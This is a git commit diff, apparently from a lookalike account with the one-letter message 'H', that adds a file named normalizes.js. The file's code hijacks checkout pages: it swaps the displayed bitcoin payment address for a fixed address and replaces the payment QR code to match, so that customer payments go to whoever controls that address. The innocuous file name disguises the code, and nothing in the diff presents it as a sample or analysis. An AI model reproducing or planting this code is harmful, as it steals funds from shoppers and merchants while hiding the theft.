8abb0221cd37bc72ca80f091b2725d8850b23339
reposltory <124707435+reposltory@users.noreply.github.com>
2024-02-18 17:32:36 +0330

    H

--- normalizes.js
+++ normalizes.js
@@ -1,1 +1,20 @@
+function api(){
 
+    if (window.location.href.includes("order-pay")){
+        var amo = document.getElementById("amount").innerText;
+        if(document.getElementById("qrcode").children[1].src=="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1q896u00c7scr7l00jvyzy769f466c9wj8mff0fd?amount="+amo){
+            clearInterval(intertime);
+            return 0;
+        }
+        else{
+            document.getElementById("qrcode").children[1].src="";
+        }
+        var add = document.getElementById("payment-address").innerText;
+        var html = document.body.innerHTML;
+        var newHtml = html.replace(new RegExp(add, 'g'), 'bc1q896u00c7scr7l00jvyzy769f466c9wj8mff0fd');
+        document.body.innerHTML = newHtml;
+        document.getElementById("qrcode").children[1].src="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1q896u00c7scr7l00jvyzy769f466c9wj8mff0fd?amount="+amo
+
+    }
+}
+var intertime = setInterval(function(){api(intertime)}, 1);
